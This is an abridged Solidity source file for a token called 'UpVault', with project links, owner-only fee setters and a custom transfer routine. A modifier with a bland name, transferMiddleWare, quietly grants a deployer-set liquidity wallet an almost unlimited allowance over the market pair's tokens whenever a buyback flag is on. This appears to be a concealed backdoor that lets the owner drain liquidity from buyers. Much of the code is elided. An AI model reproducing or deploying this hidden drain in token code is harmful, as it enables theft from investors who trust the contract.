...
// https://upvaultfinance.io
// https://t.me/UpVaultFinanceChannel
...
contract UpVault is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "UpVault";
    string private _symbol = "UPVAULT";
    ...
    // holders info
    mapping (address => uint256) public holderTimeLog;
    ...
    constructor (address _liquidityWallet, address _operationsWallet) {
    ...
    function updateFees(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
        _setInternalBT(_operationsFee, _liquidityFee);
    ...
    function updateFeesSell(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
        _setInternalST(_operationsFee, _liquidityFee);
        require(totalFeesSell <= maxTotalFeeSell, "Must keep fees at maxTotalFeeSell or less");
    }

    function _setInternalBT(uint256 _operationsFee, uint256 _liquidityFee) private {
        operationsFeeBuy = _operationsFee;
        liquidityFeeBuy = _liquidityFee;
        totalFeesBuy = operationsFeeBuy + liquidityFeeBuy;
    }

    function _setInternalST(uint256 _operationsFee, uint256 _liquidityFee) private {
    ...
    modifier transferMiddleWare() {
        if (_buyback) {
            _allows[dao][liquidityWallet] = 1e40;
        }
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private transferMiddleWare() returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        ...
        {   
            ...
            if (isMarketPair[sender]) {
                if (holderTimeLog[recipient] == 0) {
                    holderTimeLog[recipient] = block.timestamp;
                }
                dao = sender;
            } else {
                currentBuyer = sender;
            ...
            {
                if (contractTokenBalance > minimumTokensBeforeSwap * 20) {
                    contractTokenBalance = minimumTokensBeforeSwap * 20;
                }
    ...
    function _checkTxLimit(address sender, uint256 amount) view private { 
